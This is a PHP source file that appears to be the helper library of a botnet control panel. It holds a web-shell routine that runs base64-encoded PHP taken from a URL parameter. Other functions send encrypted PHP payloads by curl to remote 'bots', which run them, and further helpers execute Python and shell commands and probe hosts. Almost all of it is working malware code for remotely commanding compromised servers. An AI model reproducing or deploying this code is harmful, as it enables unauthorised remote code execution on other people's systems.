<?php
include("commandeLib.php");
function getMasterLink(){
	global  $_SERVER ; 
	if(strlen($_SERVER['HTTP_HOST']) != 0)$domaine=$_SERVER['HTTP_HOST'];
	else $domaine = $_SERVER['SERVER_NAME'] ;
	$path = $domaine.$_SERVER['SCRIPT_NAME'];
	return $path;
}

function execPHP(){
	GLOBAL $_GET ;
	if(isset($_GET['PHPCOMM'])){
		@ob_flush();@ob_start();$file = tempnam(sys_get_temp_dir(), 'GK').".php";
		file_put_contents($file, '<?'.base64_decode(trim($_GET['PHPCOMM'])).'?>');
		include($file);echo @ob_get_clean();@unlink($file);@ob_end_flush();
	}

}
function makeFile($path){
	return @file_put_contents($path, '');
}
function includeCmd($cmd){
	$data = array ();
	if(!preg_match("/#cmd/", $cmd) && !preg_match("/#python/", $cmd) ){
		$data['code'] = $cmd ;
		return $data;
	}
	else {
		$cmds =  explode("\n", $cmd);
		$p = 0 ;

		$code ="";
		$cmdss= "";
		$python= "";
		foreach ($cmds as $comm) {
			
			if(preg_match("/#cmd/", $comm)){
				if($p==1)$p=0;
				else $p = 1 ;
			}
			else if(preg_match("/#python/", $comm)){

				if($p==2)$p=0;
				else $p = 2 ;


			}
			else {

				if($p==0){
					$code.=  $comm."\n";
				}
				else if( $p ==1) {

					$cmdss.= $comm."";
				}
				else if($p == 2){
					$python= $comm."\n";
				}
			}


		}
		
		$data['code'] = $code ; 
		$data['cmds'] = $cmdss ;
		$data['python'] = $python ;
		return $data ;
	}
}
function execPython($python){
    file_put_contents("tst.py", $python);
    @chmod("tst.py", 0777);
    $data =  execCmd("python tst.py");
   return $data;
}
function printError(){
	$message = array ();
	$message['status'] = false ;
	echo json_encode($message);
	die();
}
function printSucess($data = NULL){
	$message['data'] = array ();
	$message['status'] = true ;
	if(isset($data)){
		$message['data']  = $data ;
	}
	
	echo json_encode($message);
	die();
}
function file_post_contents($bot , $data= NULL ){
	global $functions ;
	if(isset($bot['link'] , $bot['key'])){
		
		$link = $bot['link']  ; 
		$ch = curl_init();
		$hash = sha1($bot['key']);
		curl_setopt($ch,CURLOPT_URL, $link);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		if(isset($data)){

			$data['PHPCOMM'] = base64_decode($data['PHPCOMM']);
			
			foreach ($data as $key => $value) {
				if($key !== "PHPCOMM"){
					$data['PHPCOMM']=' $_POST["'.$key.'"] = str_replace("\0", "", decrypteObject($_POST["'.$key.'"] , $key , $id))   ;  '.$data['PHPCOMM'];
				}
				
			}
			
			$data['PHPCOMM'] = $functions['decrypteObject'].$data['PHPCOMM'] ;

			$fields_string = "";
			foreach ($data as $key => $value) {
				$newValue = crypteObject($value ,$bot['key']  , $hash);
				$fields_string .= $key.'='.urlencode($newValue).'&';
			}
			$fields_string .= '&hashbot='.urlencode($hash);
			rtrim($fields_string, '&');
			curl_setopt($ch,CURLOPT_POST, 1);
			curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
		}
		$result = curl_exec($ch);
		

		curl_close($ch);
		return decrypteObject($result , $bot['key'] , sha1($bot['key'])) ;	
	}
	else{

		return false;
	}
	
}
function file_post_content( $link , $data = NULL ){

	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL, $link);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	if(isset($data)){
		$fields_string = "";
		foreach ($data as $key => $value) {
			$fields_string .= $key.'='.urlencode($value).'&';
		}
		rtrim($fields_string, '&');
		curl_setopt($ch,CURLOPT_POST, 1);
		curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
	}
	$result = curl_exec($ch);
	curl_close($ch);
	return $result ;
}
function includeFunction($txt){
	GLOBAL $functions;
	$data = explode("\n" , $txt );
	$newtxt = "";
	foreach ($data as $line) {
		if(preg_match('/#use/', $line)){
			$line = str_replace("#use","", $line);
			$line = str_replace(";","", $line);
			$line =preg_replace('/\s/', '',$line); 
			if(isset($functions[$line])){
				$newtxt.= $functions[$line]."\n";
			}
			else {
				$newtxt.= $line."\n";
			}
			

		}
		else {
			$newtxt.= $line."\n";
		}
	}
	return $newtxt;
}
function runPython($pythonCode){
	$i = rand(0,500).md5($pythonCode).".py";
	//@file_put_contents(, data)
}

function ping($ip , $port = 80){
    $starttime = microtime(true);
    $file      = @fsockopen ($ip, $port, $errno, $errstr, 10);
    $stoptime  = microtime(true);
    $status    = 0;

    if (!$file) $status = -1;  // Site is down
    else {
        fclose($file);
        $status = ($stoptime - $starttime) * 1000;
        $status = floor($status);
    }
    return $status;
}
function tellBotToHost($bot, $data){
	GLOBAL $functions;

	$phpComm  = "";
	$phpComm .= $functions['randName'];
	$phpComm .= $functions['HostData'];
	$phpComm .= "HostData();";
		$post = array();
		$post['PHPCOMM'] = base64_encode($phpComm);
		$post['data'] = $data;
		$result= trim(file_post_contents($bot , $post)) ;
		return $result;

}
function randKey ($lenght = 32 ){

		$abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.,/!@#$%^&*()_{};:`~";
		$name ="";
		for ($i=0; $i <$lenght ; $i++) { 
			$name.=$abc[rand(0,strlen($abc)-1)];
		}
		return $name;
	}
	function randName ($lenght = 12 ){
		$abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
		$name ="";
		for ($i=0; $i <$lenght ; $i++) { 
			$name.=$abc[rand(0,strlen($abc)-1)];
		}
		return $name;
	}
	function decrypteObject($objectStringCrypted , $key , $hash){

   $key = substr($key, 0, 32);
   $iv_size = 16;
   $iv = substr( $hash, 0, $iv_size);
   $ciphertext_dec = base64_decode($objectStringCrypted);
   $iv_dec = substr($ciphertext_dec, 0, $iv_size);
   $ciphertext_dec = substr($ciphertext_dec, $iv_size);
   $plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);
   return $plaintext_dec ;


}

	function crypteObject($objectString , $key  , $hash){

      $key = substr($key, 0, 32);
      $iv_size = 16;
      $iv = substr( $hash, 0, $iv_size);
      $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key ,$objectString, MCRYPT_MODE_CBC, $iv);
      $ciphertext = $iv . $ciphertext;
      $ciphertext_base64 = base64_encode($ciphertext); 
      return $ciphertext_base64 ;



  }

?>